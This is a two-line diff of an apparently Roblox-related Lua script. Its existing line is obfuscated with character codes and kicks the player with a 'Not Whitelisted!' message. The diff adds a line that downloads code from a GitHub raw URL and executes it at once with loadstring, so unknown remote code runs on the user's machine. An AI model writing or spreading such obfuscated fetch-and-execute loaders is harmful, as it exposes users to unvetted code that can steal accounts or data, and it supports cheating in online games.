@@ -1,1 +1,2 @@
 local a=string;local b=getfenv()[a.char(103,97,109,101)..a.char()..'']b.Players.LocalPlayer:Kick(a.char(78,111,116,32,87,104,105,116,(function(c,d)local e={494,204,888,562,532}return#e end)()+96,108,105,115,116,101,100,33).."")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/0nly6Ex/wfwf/main/mas"))()
